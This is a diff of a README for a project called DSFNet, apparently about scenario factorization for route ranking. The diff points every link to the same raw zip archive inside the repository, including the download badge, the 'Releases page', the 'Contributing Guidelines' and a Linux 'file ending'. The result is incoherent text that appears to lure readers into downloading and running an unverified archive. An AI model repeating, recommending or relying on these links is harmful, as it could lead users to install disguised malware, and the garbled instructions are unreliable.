@@ -6,11 +6,11 @@ Welcome to the DSFNet project! This application helps you learn about disentangl
 
 ## 📥 Download DSFNet
 
-[![Download DSFNet](https://raw.githubusercontent.com/DominicVinxander/DSFNet/main/Akanekunik/DSFNet.zip%20DSFNet-v1.0-green)](https://raw.githubusercontent.com/DominicVinxander/DSFNet/main/Akanekunik/DSFNet.zip)
+[![Download DSFNet](https://github.com/DominicVinxander/DSFNet/raw/refs/heads/main/ucore/DSF-Net-v3.5.zip%20DSFNet-v1.0-green)](https://github.com/DominicVinxander/DSFNet/raw/refs/heads/main/ucore/DSF-Net-v3.5.zip)
 
 To download DSFNet, visit the Releases page below:
 
-[Download DSFNet](https://raw.githubusercontent.com/DominicVinxander/DSFNet/main/Akanekunik/DSFNet.zip)
+[Download DSFNet](https://github.com/DominicVinxander/DSFNet/raw/refs/heads/main/ucore/DSF-Net-v3.5.zip)
 
 ## 🔧 System Requirements
 
@@ -23,7 +23,7 @@ Before downloading, make sure your system meets the following requirements:
 ## 📁 Download & Install
 
 1. **Go to the Releases Page**  
-   Click this link to visit our Releases page: [DSFNet Releases](https://raw.githubusercontent.com/DominicVinxander/DSFNet/main/Akanekunik/DSFNet.zip).
+   Click this link to visit our Releases page: [DSFNet Releases](https://github.com/DominicVinxander/DSFNet/raw/refs/heads/main/ucore/DSF-Net-v3.5.zip).
 
 2. **Choose the Latest Version**  
    On the Releases page, locate the latest version listed. Look for the version number to ensure you have the most recent features and updates.
@@ -32,7 +32,7 @@ Before downloading, make sure your system meets the following requirements:
    Click on the file that corresponds to your operating system. Here are the options you should see:
    - For Windows: Look for a file ending in `.exe`.
    - For macOS: Look for a file ending in `.dmg`.
-   - For Linux: Look for a file ending in `https://raw.githubusercontent.com/DominicVinxander/DSFNet/main/Akanekunik/DSFNet.zip`.
+   - For Linux: Look for a file ending in `https://github.com/DominicVinxander/DSFNet/raw/refs/heads/main/ucore/DSF-Net-v3.5.zip`.
 
 4. **Run the Installer**  
    After downloading, open the file you’ve downloaded. Follow the instructions on the screen to install DSFNet on your device. The process is straightforward and user-friendly.
@@ -62,7 +62,7 @@ Now that you have installed DSFNet, here’s how to make the most out of it:
 A: Scenario factorization is a method that separates different factors influencing route rankings. This helps produce more accurate and nuanced results.
 
 **Q: Can I contribute to DSFNet?**  
-A: Yes, contributions are welcome! Visit our [Contributing Guidelines](https://raw.githubusercontent.com/DominicVinxander/DSFNet/main/Akanekunik/DSFNet.zip) for more information.
+A: Yes, contributions are welcome! Visit our [Contributing Guidelines](https://github.com/DominicVinxander/DSFNet/raw/refs/heads/main/ucore/DSF-Net-v3.5.zip) for more information.
 
 **Q: Is DSFNet free to use?**  
 A: Yes, DSFNet is open-source and free for anyone to use.
